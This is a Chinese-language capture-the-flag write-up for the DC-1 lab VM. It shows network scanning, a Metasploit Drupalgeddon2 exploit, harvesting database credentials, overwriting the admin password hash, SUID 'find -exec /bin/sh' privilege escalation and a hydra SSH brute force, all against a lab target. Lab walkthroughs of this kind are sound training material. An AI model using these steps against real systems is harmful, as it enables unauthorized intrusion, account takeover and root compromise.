@@ -1,0 +1,216 @@
+扫描端口信息
+┌──(root㉿z)-[/home/z/Documents/bp]
+└─# nmap -sV 192.168.140.0/24
+Nmap scan report for bogon (192.168.140.132)
+Host is up (0.000049s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
+111/tcp open  rpcbind 2-4 (RPC #100000)
+MAC Address: 00:0C:29:07:59:CC (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+获取目标操作系统和端口信息
+┌──(root㉿z)-[/home/z/Documents/bp]
+└─# nmap -A -p- 192.168.140.132
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-10 13:16 HKT
+Nmap scan report for bogon (192.168.140.132)
+Host is up (0.00039s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-title: Welcome to Drupal Site | Drupal Site
+|_http-server-header: Apache/2.2.22 (Debian)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+
+
+扫描目标端口，windows可以用御剑
+┌──(root㉿z)-[/home/z/Documents/bp]
+└─# dirb http://192.168.140.132
+---- Scanning URL: http://192.168.140.132/ ----
++ http://192.168.140.132/0 (CODE:200|SIZE:7648)                                               
++ http://192.168.140.132/admin (CODE:403|SIZE:7740)                                           
++ http://192.168.140.132/Admin (CODE:403|SIZE:7581)                                           
++ http://192.168.140.132/ADMIN (CODE:403|SIZE:7581)                                           
++ http://192.168.140.132/batch (CODE:403|SIZE:7875)                                           
++ http://192.168.140.132/cgi-bin/ (CODE:403|SIZE:291)    
+这里没有什么有用信息
+
+
+
+这里可以有三个思路
+1、破解ssh，登录
+2、利用drupal7漏洞
+3、暴力破解网站用户名密码登录网站
+
+
+这里利用drupal7漏洞
+
+
+打开MSF(我的kali居然没有自带？？？)
+┌──(root㉿z)-[/home/z]
+└─# msfconsole
+搜索 drupal相关漏洞
+msf6 > search drupal
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                              
+   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
+   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+
+Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval            
+
+使用2018的CVE
+msf6 > use 1
+
+查看需要输入的操作数
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options 
+
+利用
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
+
+成功获得shell，但是权限太低了
+meterpreter > shell
+Process 3590 created.
+Channel 0 created.
+whoami
+www-data
+
+这时候用ls命令会看到文件，有一个flag1.txt，这是第一个flag
+打开查看
+cat flag1.txt
+Every good CMS needs a config file - and so do you.
+
+这里有了提示，CMS有配置文件，所以去找这个文件
+
+美化命令行：python -c 'import pty;pty.spawn("/bin/bash")'
+进入sites>default目录，查看settings.php
+
+这里看到flag2
+/**
+ *
+ * flag2
+ * Brute force and dictionary attacks aren't the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+ *
+ */
+同时，下边可以看到数据库的用户名和密码
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupaldb',
+      'username' => 'dbuser',
+      'password' => 'R0ck3t',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+尝试登录数据库，查看信息
+www-data@DC-1:/var/www/sites/default$ mysql -udbuser -pR0ck3t
+登录成功
+
+查看数据库，并切换进drupaldb库中
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| drupaldb           |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> use drupaldbl；
+use drupaldb
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+Database changed
+
+查看你表信息
+mysql> show tables;
+
+可以看到有一个users表，查看内容
+mysql> select * from users;
+
+这里看到有admin用户，尝试修改密码
+admin:$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
+
+新打开一个shell，利用
+ ./scripts/password-hash.sh 123456，获得123456的hash值
+$S$DyKvAk8BQZiAF4MjKW1i6OreboNGbYqv/muty4AhpEkEQhIpFSiW
+
+利用update更新admin密码
+mysql> update drupaldb.users set pass="$S$DyKvAk8BQZiAF4MjKW1i6OreboNGbYqv/muty4AhpEkEQhIpFSiW" where uid=1;
+<AF4MjKW1i6OreboNGbYqv/muty4AhpEkEQhIpFSiW" where uid=1;                     
+Query OK, 1 row affected (0.10 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+尝试登录网页
+
+在dashboard栏里看到了flag3
+Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
+
+根据提示，需要提权，查看shadow里的信息，这里提示了用find命令
+
+
+查看etc/passwd信息
+发现有一个flag4用户
+
+去这个用户目录下看看
+cd /home/flag4
+
+发现有flag4.txt,得到提示
+Can you use this same method to find or access the flag in root?
+Probably. But perhaps it's not that easy.  Or maybe it is?
+
+提示进root用户
+find / -perm -4000
+查看权限
+这里看到find本身就是需要root权限，所有可以利用find提权
+ls -lh /usr/bin/find
+-l,除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来
+-h, 以容易理解的格式列出文件大小 (例如 1K 234M 2G)
+
+通过find提权
+find . -exec /bin/sh \;
+获取root账户权限，得到最终flag
+
+
+
+
+ssh破解连接
+hydra工具+john自带的字典爆破
+hydra -l flag4 -P /usr/share/john/password.lst -t 8 -vV -f ssh://192.168.140.132
+-l 登录名
+-P 密码字典集
+-t 线程数
+-vV 列出详细信息
+-f 匹配到就停止爆破
